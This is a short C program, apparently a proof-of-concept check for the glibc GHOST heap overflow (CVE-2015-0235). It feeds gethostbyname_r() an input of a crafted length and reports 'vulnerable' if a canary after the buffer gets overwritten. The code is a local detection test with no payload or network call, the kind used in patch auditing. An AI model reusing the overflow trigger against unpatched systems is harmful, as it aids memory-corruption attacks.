# include <netdb.h>
# include <stdio.h>
# include <stdlib.h>
# include <string.h>
# include <errno.h>

# define CANARY "Is_it_vulnerable?"

/*
*************************************************************************************************
Publication date: 27/01/2015

Vulnerability impact: High

Type: Heap based buffer overflow in  gethstbyname() / gethostbyname2()  function via libc

Details: http://www.openwall.com/lists/oss-security/2015/01/27/9

Other way to detect your glibc version: ldd --version
*************************************************************************************************
*/

struct {
	char buffer[1024];
	char canary[sizeof(CANARY)];
} temp = { "buffer", CANARY };

int main(void) {
	struct hostent resbuf;
	struct hostent *result;
	int herrno;
	int retval;

	printf("GLIBC CVE-2015-0235 (Ghost) PoC\n\nIt permit you to know if you're vulnerable to the CVE and you libc version is...\n");
	size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
	
	char name[sizeof(temp.buffer)];
	memset(name, '0', len);
	name[len] = '\0';
	
	retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);

	if (strcmp(temp.canary, CANARY) != 0) {
		puts("Is vulnerable ! \n");
		exit(EXIT_SUCCESS);
	}
	if (retval == ERANGE) {
		puts("Is not vulnerable \n");
		exit(EXIT_SUCCESS);
	}
puts("Don't know...good luck \n");
return(1);
}